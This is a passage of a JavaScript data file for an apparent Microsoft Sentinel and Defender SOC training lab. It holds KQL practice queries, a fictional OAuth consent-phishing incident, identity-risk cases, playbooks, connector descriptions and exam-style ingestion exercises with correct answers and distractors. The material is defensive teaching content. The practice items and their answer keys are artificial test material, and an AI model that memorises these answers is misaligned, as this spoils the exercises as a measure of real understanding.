    description:'Summarize outbound sessions by source host for a quick blast-radius view.',
    expectedRows:4,
    query:`_Im_NetworkSession(eventtype="NetworkSession")
| summarize Events=count() by SrcHostname
| order by Events desc`,
  },
];

const ASIM_NETWORK_SESSION_NOTES = [
  { title:'Normalization target', detail:'Network sessions normalize source and destination IPs, ports, hostnames, direction, and result so firewall and proxy feeds can be hunted together.' },
  { title:'Source mapping', detail:'Firewall denies, proxy allows, and gateway quarantine rows can all flow into one ASIM network session parser in the lab.' },
  { title:'Investigation pivot', detail:'Use the normalized rows to trace where traffic originated, whether it was blocked, and which host or domain should be reviewed next.' },
];

const KQL_PRACTICE_TASKS = [
  {
    id:'filter-risky-signins',
    title:'Filter high-risk sign-ins',
    concept:'where + equality',
    expectedRows:2,
    table:'SigninLogs',
    query:`SigninLogs
| where RiskLevel == "High"
| project TimeGenerated, UserPrincipalName, IPAddress, RiskLevel, ResultType`,
  },
  {
    id:'join-logon-correlation',
    title:'Join endpoint and identity logons',
    concept:'join kind=inner',
    expectedRows:4,
    table:'DeviceLogonEvents + IdentityLogonEvents',
    query:`DeviceLogonEvents
| where Timestamp > ago(1d)
| join kind=inner (
    IdentityLogonEvents
    | where Timestamp > ago(1d)
    | project IdTime = Timestamp, AccountSid, IPAddress, Application, IdActionType = ActionType
  ) on AccountSid
| where abs(datetime_diff('second', Timestamp, IdTime)) < 120
| project Timestamp, DeviceName, AccountName, AccountSid, IdTime, IPAddress, Application, IdActionType`,
  },
  {
    id:'summarize-securityevent',
    title:'Summarize SecurityEvent by computer',
    concept:'summarize + countif',
    expectedRows:3,
    table:'SecurityEvent',
    query:`SecurityEvent
| summarize Events = count(), Failures = countif(EventID == 4625) by Computer
| order by Events desc`,
  },
  {
    id:'union-logon-events',
    title:'Union logon tables and group by SID',
    concept:'union + summarize',
    expectedRows:3,
    table:'DeviceLogonEvents + IdentityLogonEvents',
    query:`union DeviceLogonEvents, IdentityLogonEvents
| summarize Events = count() by AccountSid
| order by Events desc`,
  },
  {
    id:'argmax-processes',
    title:'Arg-max the latest process per device',
    concept:'arg_max()',
    expectedRows:4,
    table:'DeviceProcessEvents',
    query:`DeviceProcessEvents
| summarize (Timestamp, FileName, FolderPath, SHA256) = arg_max(Timestamp, FileName, FolderPath, SHA256) by DeviceName
| order by DeviceName asc`,
  },
  {
    id:'parse-practice',
    title:'Parse text fields into columns',
    concept:'parse / extract',
    expectedRows:3,
    table:'KQLPractice_CL',
    query:`KQLPractice_CL
| parse Message with "user=" User " ip=" IP " action=" Action
| project TimeGenerated, Scenario, User, IP, Action`,
  },
  {
    id:'json-practice',
    title:'Extract values from JSON payloads',
    concept:'parse_json()',
    expectedRows:3,
    table:'KQLPractice_CL',
    query:`KQLPractice_CL
| extend Json = parse_json(Payload)
| project TimeGenerated, Scenario, User = tostring(Json.user), Device = tostring(Json.device), Risk = tostring(Json.risk)`,
  },
  {
    id:'split-practice',
    title:'Split delimited tags',
    concept:'split()',
    expectedRows:3,
    table:'KQLPractice_CL',
    query:`KQLPractice_CL
| extend FirstTag = split(Tags, "|")[0]
| project TimeGenerated, Scenario, FirstTag`,
  },
  {
    id:'externaldata-practice',
    title:'Query a local CSV via externaldata',
    concept:'externaldata',
    expectedRows:2,
    table:'kql-practice.csv',
    query:`externaldata (Domain:string, Category:string, Priority:int)
  [@"kql-practice.csv"]
  with (format="csv")
| where Category == "phish"
| project Domain, Priority`,
  },
  {
    id:'render-timechart',
    title:'Draw a timechart from hourly bins',
    concept:'render timechart',
    expectedRows:2,
    table:'KQLPractice_CL',
    query:`KQLPractice_CL
| summarize Events = count() by bin(TimeGenerated, 1h)
| render timechart`,
  },
  {
    id:'render-barchart',
    title:'Draw a bar chart by scenario',
    concept:'render barchart',
    expectedRows:3,
    table:'KQLPractice_CL',
    query:`KQLPractice_CL
| summarize Events = count() by Scenario
| render barchart`,
  },
  {
    id:'render-piechart',
    title:'Draw a pie chart by source',
    concept:'render piechart',
    expectedRows:3,
    table:'KQLPractice_CL',
    query:`KQLPractice_CL
| summarize Events = count() by Source
| render piechart`,
  },
];

const SENTINEL_GRAPH = {
  incidentId:'INC-1042',
  sourceNodeId:'user-jane',
  nodes:ATTACK_STORIES['INC-1042'].nodes,
  edges:ATTACK_STORIES['INC-1042'].edges,
  initialNodeIds:['mailbox-jane','url-doc','user-jane','consent-grant','app-docviewer','mail-api'],
  criticalNodeIds:['finance-sp','cfo-mailbox','payroll-sp','m365-admin','legal-onedrive'],
  positions:{
    'mailbox-jane':{x:9,y:25},
    'url-doc':{x:23,y:25},
    'user-jane':{x:23,y:55},
    'consent-grant':{x:39,y:55},
    'app-docviewer':{x:55,y:55},
    'mail-api':{x:70,y:40},
    'cfo-mailbox':{x:87,y:12},
    'hr-mailbox':{x:93,y:33},
    'finance-sp':{x:72,y:72},
    'payroll-sp':{x:91,y:64},
    'm365-admin':{x:92,y:87},
    'teams-channel':{x:52,y:84},
    'powerbi-finance':{x:69,y:91},
    'legal-onedrive':{x:38,y:88},
  },
  nodeMeta:{
    'mailbox-jane':{risk:'high',status:'Access observed',group:'mailboxes',summary:'Graph activity shows the newly consented app reading Jane Doe\'s inbox seconds after the grant.',table:'GraphActivityLogs',firstSeen:'08:24:19 UTC'},
    'url-doc':{risk:'high',status:'Blocked',summary:'The URL delivered a consent-phishing workflow and is linked to other credential-harvest infrastructure.',table:'UrlClickEvents',firstSeen:'08:11:00 UTC'},
    'user-jane':{risk:'high',status:'Compromised',summary:'The finance user clicked the phishing URL and approved broad delegated permissions for an unverified application.',table:'SigninLogs',firstSeen:'08:11:42 UTC'},
    'consent-grant':{risk:'high',status:'Revoked',summary:'Delegated Mail.ReadWrite and Files.Read.All scopes were granted to DocViewer Pro.',table:'AuditLogs',firstSeen:'08:23:00 UTC'},
    'app-docviewer':{risk:'high',status:'Tenant block pending',summary:'An unverified OAuth application used Jane\'s delegated token to access 365 content.',table:'CloudAppEvents',firstSeen:'08:23:04 UTC'},
    'mail-api':{risk:'high',status:'Active evidence',summary:'The delegated Mail.ReadWrite permission connects the malicious app to mailboxes Jane can access.',table:'GraphActivityLogs',firstSeen:'08:24:19 UTC'},
    'finance-sp':{risk:'high',status:'Critical asset',group:'content',summary:'Jane\'s Finance Contributors membership makes quarterly forecast files reachable through Files.Read.All.',response:'Review files read by the app, remove the delegated token, and temporarily restrict Jane\'s access while scoping exposure.',table:'OfficeActivity',firstSeen:'08:26:41 UTC'},
    'cfo-mailbox':{risk:'high',status:'Critical asset',group:'mailboxes',summary:'Jane has delegate access to the CFO mailbox; the malicious delegated token could read or modify its content.',response:'Audit message reads and inbox-rule changes, then remove Jane\'s delegate access until the identity is recovered.',table:'GraphActivityLogs',firstSeen:'08:27:12 UTC'},
    'm365-admin':{risk:'medium',status:'Potential path',summary:'The app has no admin role today, but the graph identifies an approval path through an application administrator.',table:'AuditLogs',firstSeen:'Not observed'},
    'teams-channel':{risk:'medium',status:'Adjacent asset',group:'collaboration',summary:'Finance channel history is adjacent to Jane\'s identity, but no channel read was observed in this incident.',table:'CloudAppEvents',firstSeen:'Not observed'},
    'payroll-sp':{risk:'high',status:'Critical asset',group:'content',summary:'Payroll files are reachable through an inherited Finance Contributors group and the delegated Files.Read.All scope.',response:'Review file-access events, revoke the application grant, and notify the payroll data owner if reads are confirmed.',table:'OfficeActivity',firstSeen:'08:29:05 UTC'},
    'hr-mailbox':{risk:'medium',status:'Potential path',group:'mailboxes',summary:'The shared HR mailbox appears because Jane has temporary delegate access; no access event is confirmed.',table:'GraphActivityLogs',firstSeen:'Not observed'},
    'powerbi-finance':{risk:'medium',status:'Adjacent asset',group:'collaboration',summary:'Finance Power BI workspaces are related to Jane, but the consented scopes do not prove dataset access.',table:'PowerBIActivity',firstSeen:'Not observed'},
    'legal-onedrive':{risk:'medium',status:'Critical data path',group:'content',summary:'A cross-functional legal folder shared with Jane could be enumerated with the delegated file permission.',response:'Validate whether the app accessed the shared folder and remove stale cross-functional sharing if it is unnecessary.',table:'OfficeActivity',firstSeen:'Not observed'},
  },
  edgeEvidence:{
    'mailbox-jane|url-doc':{source:'EmailUrlInfo + UrlClickEvents',time:'08:11:00 UTC',confidence:'High',detail:'The delivered message contained the URL and the Safe Links record confirms Jane clicked it.'},
    'url-doc|user-jane':{source:'SigninLogs',time:'08:11:42 UTC',confidence:'High',detail:'A sign-in session for Jane began from 76.21.55.4 immediately after the URL click.'},
    'user-jane|consent-grant':{source:'AuditLogs',time:'08:23:00 UTC',confidence:'High',detail:'Consent to application operation recorded Jane as the initiating user.'},
    'consent-grant|app-docviewer':{source:'AuditLogs',time:'08:23:00 UTC',confidence:'High',detail:'The grant lists DocViewer Pro and the Mail.ReadWrite and Files.Read.All delegated scopes.'},
    'app-docviewer|mail-api':{source:'CloudAppEvents',time:'08:24:19 UTC',confidence:'High',detail:'The app exchanged the delegated grant for Graph mailbox access.'},
    'mail-api|mailbox-jane':{source:'GraphActivityLogs',time:'08:24:19 UTC',confidence:'High',detail:'A message-list operation targeted Jane Doe\'s mailbox from the new application.'},
  },
  learningTasks:[
    { id:'inspect-user',title:'Inspect the compromised identity',hint:'Select Jane Doe and review why the identity is considered compromised.' },
    { id:'trace-app',title:'Trace the consent chain',hint:'Select DocViewer Pro or one of the consent relationships.' },
    { id:'run-blast',title:'Analyze blast radius',hint:'Reveal downstream assets and identify the reachable critical data.' },
    { id:'respond',title:'Choose a response',hint:'Open a critical node and record a containment or investigation action.' },
  ],
};

const CLOUD_APP_INVESTIGATIONS = [
  { id:'MDA-OAUTH-1042', incidentId:'INC-1042', status:'Active investigation',
    appName:'DocViewer Pro', publisher:'Unverified publisher', user:'jane.doe@hacksmarterlabs.example',
    consentTime:'2026-06-28T08:23:00Z', risk:'High',
    scopes:['Mail.ReadWrite','Files.Read.All','offline_access'],
    indicators:['Consent followed a phishing URL click by 12 minutes','Publisher has no verified tenant relationship','App requested mailbox write scope and persistent refresh tokens'],
    activity:[
      { time:'2026-06-28T08:11:00Z', title:'Phishing URL clicked', detail:'MDO recorded Jane opening secure-document-portal[.]xyz.' },
      { time:'2026-06-28T08:12:00Z', title:'Interactive sign-in completed', detail:'Token issued after MFA prompt from 76.21.55.4.' },
      { time:'2026-06-28T08:23:00Z', title:'OAuth consent grant', detail:'DocViewer Pro gained Mail.ReadWrite and Files.Read.All.' },
      { time:'2026-06-28T08:31:00Z', title:'Mailbox access attempt', detail:'CloudAppEvents shows Graph mailbox enumeration by the app.' },
    ],
    response:['Revoke app consent','Block app tenant-wide','Revoke Jane Doe sessions','Search CloudAppEvents for the app ID'],
    verdict:'True positive - risky OAuth consent after phishing' },
];

const ENTRA_IDENTITY_INVESTIGATIONS = [
  { id:'IDRISK-1053', incidentId:'INC-1053', user:'sam.lee@hacksmarterlabs.example',
    status:'Needs analyst decision', userRisk:'High', signInRisk:'High',
    riskDetections:[
      { time:'2026-06-28T13:27:00Z', type:'Unfamiliar sign-in properties', risk:'High', source:'Entra ID Protection', detail:'Sign-in from NL differs from Sam Lee baseline.' },
      { time:'2026-06-28T13:28:00Z', type:'Anonymous IP address', risk:'Medium', source:'Entra ID Protection', detail:'Source 91.219.236.54 is tagged as an anonymizing service.' },
      { time:'2026-06-28T13:31:00Z', type:'Impossible travel', risk:'Medium', source:'Entra ID Protection', detail:'Prior successful sign-in from Seattle occurred 42 minutes earlier.' },
    ],
    signIns:[
      { time:'2026-06-28T12:45:00Z', app:'Teams', ip:'198.51.100.18', location:'US', result:'Success', risk:'None' },
      { time:'2026-06-28T13:27:00Z', app:'Office 365 Exchange Online', ip:'91.219.236.54', location:'NL', result:'Success', risk:'High' },
      { time:'2026-06-28T13:33:00Z', app:'Azure Portal', ip:'91.219.236.54', location:'NL', result:'Blocked by CA', risk:'High' },
    ],
    actions:['Confirm compromise','Dismiss user risk','Reset password','Revoke sessions','Require MFA re-registration'],
    decisionGuide:'Confirm compromise when the user cannot validate the NL sign-in or when follow-on activity appears from the same IP. Dismiss only after user verification and matching travel/VPN context.' },
  { id:'IDRISK-1051', incidentId:'INC-1051', user:'maria.ross@hacksmarterlabs.example',
    status:'Confirmed compromised', userRisk:'High', signInRisk:'High',
    riskDetections:[
      { time:'2026-06-28T06:40:00Z', type:'Adversary-in-the-middle', risk:'High', source:'Entra ID Protection', detail:'MFA token was satisfied through a suspected phishing proxy.' },
      { time:'2026-06-28T06:43:00Z', type:'Token replay', risk:'High', source:'Entra ID Protection', detail:'Session cookie reused from a different ASN.' },
    ],
    signIns:[
      { time:'2026-06-28T06:39:00Z', app:'365 portal', ip:'185.199.111.12', location:'US', result:'Success', risk:'High' },
      { time:'2026-06-28T06:44:00Z', app:'SharePoint Online', ip:'185.199.111.12', location:'US', result:'Interrupted', risk:'High' },
    ],
    actions:['Confirm compromise','Revoke sessions','Reset password','Require phishing-resistant MFA'],
    decisionGuide:'AiTM evidence is sufficient to confirm compromise and force credential/session cleanup.' },
];

const CASE_MANAGEMENT = [
  { id:'CASE-2406-1042', title:'OAuth consent abuse response', owner:'Me', status:'Active',
    severity:'High', linkedIncidents:['INC-1042','INC-1051'], due:'2026-06-29T12:00:00Z',
    closure:'Not ready - waiting for OAuth app block approval',
    tasks:[
      { title:'Revoke DocViewer Pro enterprise app consent', assignee:'Cloud apps responder', status:'In progress' },
      { title:'Revoke Jane Doe sessions and require MFA reset', assignee:'Identity responder', status:'Done' },
      { title:'Hunt for Mail.ReadWrite grants in CloudAppEvents', assignee:'Detection engineer', status:'Open' },
      { title:'Attach Sentinel Graph screenshot to case notes', assignee:'SOC lead', status:'Open' },
    ] },
  { id:'CASE-2406-1019', title:'Tier-0 identity attack containment', owner:'identity-soc', status:'Active',
    severity:'High', linkedIncidents:['INC-1019'], due:'2026-06-28T18:00:00Z',
    closure:'Not ready - KRBTGT rotation evidence pending',
    tasks:[
      { title:'Disable svc-backup and reset credential', assignee:'AD operations', status:'Done' },
      { title:'Revert AdminSDHolder ACL change', assignee:'Tier-0 admin', status:'In progress' },
      { title:'Collect DC01 timeline evidence', assignee:'MDE responder', status:'Done' },
    ] },
  { id:'CASE-2406-1053', title:'Sam Lee risky sign-in verification', owner:'L1-Triage', status:'Draft',
    severity:'Medium', linkedIncidents:['INC-1053'], due:'2026-06-28T16:30:00Z',
    closure:'Decision required - confirm compromise or dismiss after user callback',
    tasks:[
      { title:'Call user and validate travel/VPN use', assignee:'L1-Triage', status:'Open' },
      { title:'Review risky sign-ins and risk detections', assignee:'Identity responder', status:'Open' },
      { title:'Apply risk-based password reset if unconfirmed', assignee:'Identity responder', status:'Open' },
    ] },
];

const COPILOT_AGENTIC_FLOW = {
  title:'Agentic investigation: INC-1042 OAuth abuse',
  sessionId:'cs-009',
  prompt:'Investigate INC-1042 end to end and recommend whether to contain Jane Doe and DocViewer Pro.',
  plan:['Read incident alerts and timeline','Expand user, OAuth app, IP, URL, and mailbox entities','Run static CloudAppEvents and SigninLogs checks','Decide containment and case tasks'],
  toolCalls:[
    { tool:'get_incident', input:'INC-1042', output:'2 correlated alerts: phishing URL click and anomalous OAuth consent grant.' },
    { tool:'expand_entities', input:'jane.doe@hacksmarterlabs.example', output:'Linked URL secure-document-portal[.]xyz, app DocViewer Pro, IP 76.21.55.4, mailbox Jane Doe mailbox.' },
    { tool:'query_cloud_app_events', input:'AppName == "DocViewer Pro"', output:'Consent grant plus mailbox enumeration within eight minutes.' },
    { tool:'query_signin_logs', input:'UserPrincipalName == "jane.doe@hacksmarterlabs.example"', output:'Successful MFA-backed sign-in from unfamiliar IP immediately after URL click.' },
  ],
  verdict:'True positive. Revoke app consent, block DocViewer Pro tenant-wide, revoke Jane Doe sessions, reset credentials, and keep CASE-2406-1042 open until CloudAppEvents hunting completes.',
};

const SENTINEL_ENTITY_TYPES = [
  { type:'Account', icon:'@', identifiers:['Name','UPNSuffix','Sid','AadUserId','PUID','IsDomainJoined'] },
  { type:'Host', icon:'H', identifiers:['HostName','DnsDomain','NTDomain','AzureID','OSFamily'] },
  { type:'IP', icon:'IP', identifiers:['Address'] },
  { type:'URL', icon:'URL', identifiers:['Url'] },
  { type:'Azure Resource', icon:'AR', identifiers:['ResourceId','SubscriptionId','ResourceGroup','ResourceName'] },
  { type:'Cloud Application', icon:'CA', identifiers:['AppId','Name','InstanceName'] },
  { type:'DNS Resolution', icon:'DNS', identifiers:['DomainName','HostIpAddress'] },
  { type:'File', icon:'F', identifiers:['Name','Directory'] },
  { type:'FileHash', icon:'#', identifiers:['Algorithm','Value'] },
  { type:'Malware', icon:'M', identifiers:['Name','Category'] },
  { type:'Process', icon:'P', identifiers:['ProcessId','CommandLine','ImageFile'] },
  { type:'Registry Key', icon:'RK', identifiers:['Hive','Key'] },
  { type:'Registry Value', icon:'RV', identifiers:['Key','ValueName','ValueData'] },
  { type:'Security Group', icon:'SG', identifiers:['SID','ObjectGuid','DistinguishedName'] },
  { type:'Mailbox', icon:'MB', identifiers:['MailboxPrimaryAddress','DisplayName','AadUserId'] },
  { type:'Mail Cluster', icon:'MC', identifiers:['NetworkMessageIds','CountByDeliveryStatus'] },
  { type:'Mail Message', icon:'MM', identifiers:['NetworkMessageId','Recipient','Sender','Subject'] },
  { type:'Submission Mail', icon:'SM', identifiers:['SubmissionId','Submitter','Recipient'] },
];

const SENTINEL_WORKBOOKS = [
  { name:'Investigation Insights', owner:'SOC content', refresh:'15 min',
    panels:['Incident timeline','Alert volume by tactic','Entity pivots'],
    detail:'Triage workbook for correlating Defender XDR alerts, Sentinel incidents, and entity evidence.' },
  { name:'Identity & Access', owner:'Identity team', refresh:'30 min',
    panels:['Risky sign-ins','MFA failures','Privileged role changes'],
    detail:'Tracks Entra sign-in risk, role assignment drift, and conditional access outcomes.' },
  { name:'Cloud Posture Watch', owner:'Cloud security', refresh:'1 hour',
    panels:['Public storage','Management ports','Container alerts'],
    detail:'Combines Defender for Cloud recommendations with Sentinel alert trends for multi-cloud posture review.' },
];

const SENTINEL_PLAYBOOKS = [
  { name:'PB-IsolateDevice', trigger:'High-severity MDE alert', connector:'Defender for Endpoint',
    status:'Disabled', steps:['Get alert evidence','Isolate device','Post Teams approval card','Create ticket'] },
  { name:'PB-RevokeOAuthConsent', trigger:'OAuth consent abuse incident', connector:'Graph',
    status:'Enabled', steps:['Find service principal','Revoke grant','Revoke user sessions','Notify mailbox owner'] },
  { name:'PB-StoragePublicAccess', trigger:'Public cloud storage alert', connector:'Azure + AWS',
    status:'Enabled', steps:['Remove public ACL','Snapshot configuration','Open owner task','Add incident comment'] },
  { name:'PB-ContainEntity', trigger:'Entity trigger', connector:'Sentinel + Logic Apps',
    status:'Enabled', resourceGroup:'RG-Entity-Playbooks', permissionState:'Ready',
    steps:['Receive entity pivot context','Collect linked incidents','Contain entity in a bounded playbook','Add response notes to the case'] },
  { name:'Playbook1', trigger:'Sentinel incident', connector:'Sentinel + Logic Apps',
    status:'Enabled', resourceGroup:'RG-Playbooks', permissionState:'Needs Sentinel access',
    steps:['Receive Sentinel incident','Get incident details','Post Teams notification','Add incident comment'] },
];

const SENTINEL_AUTOMATION_LAB = {
  source:'Product documentation: Run playbooks from automation rules',
  resourceGroup:'RG-Playbooks',
  playbookName:'Playbook1',
  serviceAccount:'Sentinel service account',
  role:'Sentinel Automation Contributor',
  workspace:'soc-prod-sentinel',
  ruleDraft:{
    name:'Run Playbook1 when incident is created',
    trigger:'When incident is created',
    condition:'Incident provider = Sentinel',
    action:'Run playbook'
  },
  permissions:[
    { principal:'Me', role:'Logic App Contributor', scope:'RG-Playbooks', effect:'Can edit Logic App workflow; does not let Sentinel invoke it.' },
    { principal:'Sentinel service account', role:'Sentinel Automation Contributor', scope:'RG-Playbooks', effect:'Lets automation rules run incident-trigger playbooks in the resource group.' },
  ],
  notes:[
    'Only playbooks that use a Sentinel incident trigger are valid for automation rules triggered by incident creation.',
    'A playbook shown grayed out in the Run playbook action means Sentinel lacks permission to the playbook resource group.',
    'Use Manage playbook permissions from the automation rule action and grant Sentinel access to the resource group.'
  ]
};

const SENTINEL_DATA_CONNECTORS = [
  { name:'Defender XDR', type:'Data connector', status:'Connected',
    table:'SecurityAlert, Device*', use:'Streams Defender alerts and endpoint evidence into Sentinel incidents and hunting.' },
  { name:'Entra ID', type:'Data connector', status:'Connected',
    table:'SigninLogs, AuditLogs', use:'Provides sign-in, risk, and directory audit events for identity detections.' },
  { name:'Azure Activity', type:'Data connector', status:'Connected',
    table:'AzureActivity', use:'Collects subscription control-plane operations through Azure Policy or diagnostic settings for cloud administration detections.' },
  { name:'Azure Key Vault', type:'Diagnostic settings-based data connector', status:'Practice simulator',
    table:'AzureDiagnostics', use:'Collects Key Vault audit logs through diagnostic settings. The gallery status turns green only when data has arrived within the last 14 days.' },
  { name:'Windows Security Events via AMA', type:'Data connector', status:'Requires solution',
    table:'SecurityEvent, WindowsEvent', use:'Collects selected Windows Security Event IDs from servers and workstations through Azure Monitor Agent and a scoped DCR.' },
  { name:'Common Event Format via AMA', type:'Data connector', status:'Requires solution',
    table:'CommonSecurityLog', use:'Ingests CEF-formatted Syslog from network and security appliances through a Linux log forwarder and AMA DCR.' },
  { name:'Logs Ingestion API', type:'Custom logs ingestion', status:'Plan required',
    table:'*_CL custom tables', use:'Creates custom tables from application-owned JSON payloads using app registration, a DCR stream declaration, and optional transform KQL.' },
  { name:'Threat Intelligence - TAXII', type:'Threat intelligence connector', status:'Available',
    table:'ThreatIntelIndicators', use:'Imports STIX/TAXII indicators when a TAXII API root and collection ID are available.' },
  { name:'Defender Threat Intelligence', type:'Threat intelligence connector', status:'Available',
    table:'ThreatIntelIndicators', use:'Brings vendor-generated indicators into Sentinel for TI map analytics rules.' },
  { name:'Syslog via AMA', type:'Data connector', status:'Requires solution',
    table:'Syslog', use:'Ingests Syslog from Linux log forwarders after the Syslog solution is installed from Content hub and a DCR is created from the connector page.' },
  { name:'MITRE ATT&CK', type:'Coverage view', status:'Not a connector',
    table:'Analytics rules', use:'Lights up based on active analytics rules and assigned tactics or techniques.' },
];

const SENTINEL_CONTENT_SOLUTIONS = [
  { id:'syslog', name:'Syslog', provider:'Hack Smarter Labs', status:'Not installed',
    connectors:['Syslog via AMA'],
    use:'Adds the Syslog via AMA connector and workbook content for Linux Syslog ingestion.' },
  { id:'cef', name:'Common Event Format (CEF)', provider:'Hack Smarter Labs', status:'Not installed',
    connectors:['Common Event Format via AMA'],
    use:'Adds the CEF via AMA connector for appliances that emit CEF-formatted Syslog.' },
  { id:'threat-intel', name:'Threat Intelligence', provider:'Hack Smarter Labs', status:'Installed',
    connectors:['Defender Threat Intelligence','Threat Intelligence - TAXII'],
    use:'Adds threat intelligence connectors and analytic content for indicator matching.' },
  { id:'windows-security', name:'Windows Security Events', provider:'Hack Smarter Labs', status:'Installed',
    connectors:['Windows Security Events via AMA'],
    use:'Adds Windows event collection with Azure Monitor Agent and DCR scoping.' },
  { id:'azure-activity', name:'Azure Activity', provider:'Hack Smarter Labs', status:'Installed',
    connectors:['Azure Activity'],
    use:'Adds subscription activity collection guidance for Azure Policy and diagnostic settings.' },
  { id:'custom-logs', name:'Custom logs ingestion', provider:'Lab', status:'Planning only',
    connectors:['Logs Ingestion API'],
    use:'Study card for custom table ingestion through app registration, DCE/DCR endpoints, streams, and transforms.' },
];

const DIAGNOSTIC_SETTINGS_PRACTICE = {
  title:'Practice mode (Beta): diagnostic settings connector simulator',
  connector:'Azure Key Vault',
  workspace:'soc-prod-sentinel',
  resource:'Azure Key Vault instances',
  thresholdDays:14,
  examPrompt:'The Key Vault instances in the subscription were decommissioned three weeks ago and no diagnostic log data has been ingested since. Practice the status logic the gallery uses.',
  steps:[
    { id:'aged', title:'Replay the exam case', detail:'Three weeks without ingestion should show Disconnected even if the connector was previously configured.' },
    { id:'fresh', title:'Simulate fresh ingestion', detail:'A new event resets the 14-day window and the gallery returns to Connected.' },
    { id:'not-configured', title:'Clear the configuration', detail:'If no diagnostic setting exists at all, the gallery should show Not configured.' },
  ],
  answers:['Connected', 'Disconnected', 'Not configured'],
};

const SYSLOG_AMA_LAB = {
  source:'Product documentation: Ingest Syslog and CEF messages to Sentinel with AMA',
  workspace:'soc-prod-sentinel',
  vm:'VM1',
  os:'Linux Azure VM',
  forwarderRole:'Log forwarder',
  dcr:'DCR-Syslog-VM1',
  connector:'Syslog via AMA',
  solution:'Syslog',
  facilities:['auth','authpriv','daemon','kern','syslog','user'],
  minimumLevel:'Info',
  examPrompt:'Several network appliances send Syslog messages to VM1. Configure Syslog via AMA ingestion into Sentinel.',
  steps:[
    { id:'solution', title:'Install Syslog solution from Content hub',
      detail:'Content hub installs the solution package that exposes the Syslog via AMA data connector in Sentinel.',
      correctFirst:true },
    { id:'connector', title:'Open Syslog via AMA connector',
      detail:'Use the connector page in Sentinel to create the data collection rule instead of starting in the Azure Monitor portal.' },
    { id:'dcr', title:'Create the DCR and select VM1',
      detail:'The connector workflow creates the DCR, scopes facilities/severities, and installs Azure Monitor Agent on the selected VM.' },
    { id:'daemon', title:'Configure rsyslog on VM1',
      detail:'After the connector/DCR/AMA setup, configure the Linux forwarder daemon to listen for appliance Syslog on UDP/TCP 514.' },
    { id:'verify', title:'Verify Syslog ingestion',
      detail:'Query the Syslog table and confirm records from the network appliances arrive through VM1.' },
  ],
  distractors:[
    { title:'Install AMA on VM1 by using Azure CLI',
      why:'Not first for this connector workflow. Selecting VM1 during DCR creation from the connector page deploys AMA automatically.' },
    { title:'Configure rsyslog on VM1 to listen on port 514',
      why:'Daemon setup is still required, but it happens after installing the solution and creating the DCR/AMA path.' },
    { title:'Create a DCR from Azure Monitor',
      why:'For this Sentinel lab, create the DCR from the Syslog via AMA connector page after the Content hub solution is installed.' },
  ],
  query:`Syslog
| where TimeGenerated > ago(30m)
| where Computer == "VM1"
| summarize Events=count() by Facility, SeverityLevel, HostName
| order by Events desc`,
};

const SENTINEL_INGESTION_LABS = [
  {
    id:'windows-security',
    title:'Windows Security Events via AMA',
    solutionId:'windows-security',
    solution:'Windows Security Events',
    connector:'Windows Security Events via AMA',
    workspace:'soc-prod-sentinel',
    dcr:'DCR-Windows-Security-Servers',
    target:'Server group: DC01, FIN-FS-02, WKS-03',
    table:'SecurityEvent / WindowsEvent',
    prompt:'Collect only the Windows Security events needed for sign-in and privilege-use detections while keeping noisy event IDs out of the workspace.',
    steps:[
      { id:'solution', title:'Confirm Windows Security Events solution',
        detail:'Content hub makes the Windows Security Events via AMA connector and workbook content available.' },
      { id:'connector', title:'Open the AMA connector',
        detail:'Start from Sentinel Data connectors so the DCR is associated with the workspace and connector experience.' },
      { id:'dcr', title:'Create a DCR for Windows hosts',
        detail:'Select target machines, choose an event set, and add XPath filters for the event IDs needed by the lab.' },
      { id:'scope', title:'Scope events with XPath',
        detail:'Use a concise XPath such as Security!*[System[(EventID=4624 or EventID=4625 or EventID=4672 or EventID=4688)]].' },
      { id:'verify', title:'Verify Windows rows',
        detail:'Query SecurityEvent and confirm expected logon, privileged logon, and process creation events.' },
    ],
    query:`SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID in (4624, 4625, 4672, 4688)
| summarize Events=count() by Computer, EventID, Account
| order by Events desc`,
  },
  {
    id:'cef',
    title:'CEF via AMA',
    solutionId:'cef',
    solution:'Common Event Format (CEF)',
    connector:'Common Event Format via AMA',
    workspace:'soc-prod-sentinel',
    dcr:'DCR-CEF-FW1',
    target:'Linux forwarder: CEF-FWD-01',
    table:'CommonSecurityLog',
    prompt:'A firewall and email gateway emit CEF-formatted Syslog to a Linux forwarder. Bring the rows into Sentinel through AMA.',
    steps:[
      { id:'solution', title:'Install CEF solution from Content hub',
        detail:'The solution exposes the CEF via AMA connector and expected CommonSecurityLog schema.' },
      { id:'connector', title:'Open CEF via AMA connector',
        detail:'Use the connector workflow so Sentinel creates the DCR for the forwarder and workspace.' },
      { id:'dcr', title:'Create the DCR and select CEF-FWD-01',
        detail:'The DCR deploys AMA, selects facilities/severities, and routes CEF records to CommonSecurityLog.' },
      { id:'daemon', title:'Configure syslog forwarding',
        detail:'Forward appliance CEF messages to the Linux collector and keep transport/local firewall rules aligned.' },
      { id:'verify', title:'Verify CommonSecurityLog',
        detail:'Query CommonSecurityLog for vendor, device action, source, destination, and severity fields.' },
    ],
    query:`CommonSecurityLog
| where TimeGenerated > ago(1h)
| summarize Events=count() by DeviceVendor, DeviceProduct, DeviceAction, LogSeverity
| order by Events desc`,
  },
  {
    id:'azure-activity',
    title:'Azure Activity collection',
    solutionId:'azure-activity',
    solution:'Azure Activity',
    connector:'Azure Activity',
    workspace:'soc-prod-sentinel',
    dcr:'Diagnostic setting: send AzureActivity to soc-prod-sentinel',
    target:'Subscriptions: Hack-Smarter-Labs-Prod, Hack-Smarter-Labs-Shared',
    table:'AzureActivity',
    prompt:'Collect subscription control-plane operations so Sentinel can detect risky role assignments, policy changes, and public network exposure changes.',
    steps:[
      { id:'policy', title:'Choose Azure Policy for scale',
        detail:'Use policy when many subscriptions must send activity logs to the same workspace.' },
      { id:'diagnostic', title:'Create diagnostic setting',
        detail:'For a single subscription, configure the activity log diagnostic setting to send administrative, security, policy, and service health categories.' },
      { id:'connector', title:'Open Azure Activity connector',
        detail:'Confirm connected subscriptions and query examples from Sentinel Data connectors.' },
      { id:'verify', title:'Verify AzureActivity',
        detail:'Query AzureActivity for role assignment writes, policy assignment writes, and public access changes.' },
    ],
    query:`AzureActivity
| where TimeGenerated > ago(24h)
| where OperationNameValue has_any ("roleAssignments/write", "policyAssignments/write", "storageAccounts/write")
| project TimeGenerated, SubscriptionId, Caller, OperationNameValue, ActivityStatusValue, ResourceGroup, ResourceProviderValue`,
  },
  {
    id:'custom-logs',
    title:'Logs Ingestion API custom table',
    solutionId:'custom-logs',
    solution:'Custom logs ingestion',
